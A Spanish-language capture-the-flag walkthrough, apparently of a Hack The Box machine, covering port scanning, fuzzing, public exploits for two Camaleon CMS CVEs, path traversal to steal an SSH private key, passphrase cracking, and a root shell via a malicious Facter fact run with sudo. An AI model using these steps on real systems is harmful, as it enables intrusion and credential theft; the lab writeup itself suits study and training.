#PathTraversal #CamaleonCMS #Facter #CVE-2025-2304 #CVE-2024-46987 #sudo 

# RECONOCIMIENTO

El primer reconocimiento se hará con [[NMAP]] sobre todos los puertos usando los parametros
- `-p-` para enumerar todo el rango de puerto
- `--open` para que muestre solo los puertos abiertos
- `-sS` para Stelth Scan escaneo sigiloso
- `--min-rate 5000` para seleccionar la velocidad mínima de paquetes
- `-n` para no hacer resolución DNS
- `-Pn` para que no haga ping
- `-vvv` para que se a verbose
- `-oG` para extraerlo en formato grepeable
`nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.129.2.38 -oG allScan`

```shell
 [*] IP Address: 10.129.2.38
 [*] Open ports: 22,80,54321
```

Con los puertos encontrados hacemos un reconocimiento mas exhaustivo 
`nmap -p 22,80,54321 -sCV 10.129.2.38 -oN targeted`

### FUZZING
Habiendo encontrado el puerto `80` navegaremos a el y haremos un poco de enumeración de la pagina web
`wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://facts.htb/FUZZ`
`http://facts.htb/admin/login`

Al encontrarnos con un panel de login y de registro de usuario creamos una cuenta y accedemos con usuario creado, nos encontramos con un panel de admin de camaleón CMS versión 2.9.0.
Esta versión al buscarla en internet encontramos que tiene un CVE con un exploit que automatiza la ejecución de este en github 
`https://github.com/predyy/CVE-2025-2304/blob/main/exp.py`

También una vez tenemos permisos de administrador seguimos buscando información en el navegador y encontramos que hay otro CVE que nos permite ejecutar un `Path traversal`
`https://github.com/Goultarde/CVE-2024-46987` con el podemos enumerar directorios y ficheros de dentro del servidor de la pagina web pudiendo así obtener el `id_ed25519` del usuario `trivia` encontrado tras la enumeración gracias al Path Traversal

Esta clave nos la podemos copiar a nuestra maquina atacante y conectarnos por ssh
Al intentar conectarnos por shh no pide una passphrase para descubrirla usaremos `ssh2john` para que nos de el hash y este guardarlo en un archivo hash y luego con john pasarle este archivo junto con una wordlist

Esto nos dará el passphrase
```ad-hint
trivia::dragonballz
```

Nos conectamos por ssh `ssh -i id_ed25519 trivia@10.129.2.38`

Ejecutamos `sudo -l` y vemos que podemos ejecutar como root `/usr/bin/facter` para ejecutarlo y explotarlo haremos lo siguiente
```shell
echo 'Facter.add(:x){setcode{exec "/bin/bash"}}' > /tmp/x.rb
sudo facter --custom-dir=/tmp x
```

Y obtendremos la shell como root